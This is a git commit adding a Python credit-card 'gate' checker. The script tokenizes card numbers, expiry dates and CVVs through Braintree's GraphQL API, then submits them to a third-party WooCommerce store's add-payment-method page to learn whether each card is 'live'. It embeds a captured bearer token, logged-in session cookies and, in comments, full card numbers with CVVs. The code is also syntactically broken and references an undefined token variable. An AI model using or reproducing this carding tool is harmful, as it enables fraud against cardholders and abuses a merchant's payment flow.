19410d8abfc81beb388ab36c85595bab43310026
leader99k <166257451+leader99k@users.noreply.github.com>
2024-05-31 05:18:56 +0300

    Add files via upload

---
+++ gatet.py
@@ -0,0 +1,127 @@
+import requests,re
+def Tele(ccx):
+	import requests
+	ccx=ccx.strip()
+	n = ccx.split("|")[0]
+	mm = ccx.split("|")[1]
+	yy = ccx.split("|")[2]
+	cvc = ccx.split("|")[3]
+	if "20" in yy:#Mo3gza
+		yy = yy.split("20")[1]
+	r = requests.session()
+	import requests
+	
+	headers = {
+	    'authority': 'payments.braintree-api.com',
+    'accept': '*/*',
+    'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
+    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MTcyMDc0ODIsImp0aSI6IjlhZjJmZjNiLTA2NDYtNDVlOS1hZmUxLWMyMjc0YzgwZTRhMCIsInN1YiI6InRjZmIzZjZzbWQ3OTY0NWsiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InRjZmIzZjZzbWQ3OTY0NWsiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnt9fQ.2_Z3Y7Y_krzGY3J2RjAIQ7jO7s-LXtnTBAXc8A1whPPoipgxjsjs8gyAiI5Lm6TTbZ5TVt6TsnARJlQOwou6MA',
+    'braintree-version': '2018-05-10',
+    'content-type': 'application/json',
+    'origin': 'https://assets.braintreegateway.com',
+    'referer': 'https://assets.braintreegateway.com/',
+    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-fetch-dest': 'empty',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-site': 'cross-site',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+}
+	
+	json_data = {
+	    'clientSdkMetadata': {
+        'source': 'client',
+        'integration': 'custom',
+        'sessionId': 'c38b3f61-bb43-4e05-8670-bb01a97239c4',
+    },
+    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
+    'variables': {
+        'input': {
+            'creditCard': {
+                'number': n,
+                'expirationMonth': mm,
+                'expirationYear': yy,
+                'cvv': cvc,
+            },
+            'options': {
+                'validate': False,
+            },
+        },
+    },
+    'operationName': 'TokenizeCreditCard',
+}
+	
+	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
+
+# Note: json_data will not be serialized by requests
+# exactly as it was in the original request.
+#data = '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"c38b3f61-bb43-4e05-8670-bb01a97239c4"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"4879170037585719","expirationMonth":"10","expirationYear":"2028","cvv":"305"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}'
+#response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, data=data)
+import requests
+	
+	cookies = {
+	     '_fbp': 'fb.1.1717120887122.2125491920',
+    '_ga': 'GA1.1.365638694.1717120888',
+    'wordpress_logged_in_8f3d1d99e4cdc0b15631633dee3c0201': 'leaderssj%7C1718330559%7CFzPW2e2B5TsOtJXkblJDXfi0hY7HbhotqRb2TYRcihV%7Cd3fd7ae512dbf0baa0f43836c5152d0778198c7e2bc9803cb74ba976e930629f',
+    '_ga_1J8NJ2PN8G': 'GS1.1.1717120887.1.1.1717121176.0.0.0',
+}
+
+headers = {
+    'authority': 'forfullflavor.com',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
+    'cache-control': 'max-age=0',
+    'content-type': 'application/x-www-form-urlencoded',
+    # 'cookie': '_fbp=fb.1.1717120887122.2125491920; _ga=GA1.1.365638694.1717120888; wordpress_logged_in_8f3d1d99e4cdc0b15631633dee3c0201=leaderssj%7C1718330559%7CFzPW2e2B5TsOtJXkblJDXfi0hY7HbhotqRb2TYRcihV%7Cd3fd7ae512dbf0baa0f43836c5152d0778198c7e2bc9803cb74ba976e930629f; _ga_1J8NJ2PN8G=GS1.1.1717120887.1.1.1717121176.0.0.0',
+    'origin': 'https://forfullflavor.com',
+    'referer': 'https://forfullflavor.com/my-account/add-payment-method/',
+    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'same-origin',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+}
+	
+	
+	data = [
+	     data = {
+    'payment_method': 'braintree_credit_card',
+    'wc-braintree-credit-card-card-type': 'visa',
+    'wc-braintree-credit-card-3d-secure-enabled': '',
+    'wc-braintree-credit-card-3d-secure-verified': '',
+    'wc-braintree-credit-card-3d-secure-order-total': '0.00',
+    'wc_braintree_credit_card_payment_nonce': tok,
+    'wc_braintree_device_data': '',
+    'wc-braintree-credit-card-tokenize-payment-method': 'true',
+    'woocommerce-add-payment-method-nonce': 'e31926d828',
+    '_wp_http_referer': '/my-account/add-payment-method/',
+    'woocommerce_add_payment_method': '1',
+}
+
+response = requests.post('https://forfullflavor.com/my-account/add-payment-method/', cookies=cookies, headers=headers, data=data)
+	# Note: json_data will not be serialized by requests
+	# exactly as it was in the original request.
+	#data = '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"bdaf9471-d28d-4e54-baf4-ca04499c659d"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"4174010099391014","expirationMonth":"08","expirationYear":"2025","cvv":"888"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}'
+	#response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, data=data)
+	text=(response.text)
+	import re
+	pattern = r"Status code \d+: (.+?)\s*</li>"
+	
+	match = re.search(pattern, text)
+	if match:
+	    duplicate_message = match.group(1)
+	    return duplicate_message
+	else:
+		if 'Nice! New payment method added' in text:
+			return 'live'
+		elif 'risk_threshold' in text:
+			return 'risk_threshold'
+		else:
+			print(text)
+			return 'risk_threshold'
+	
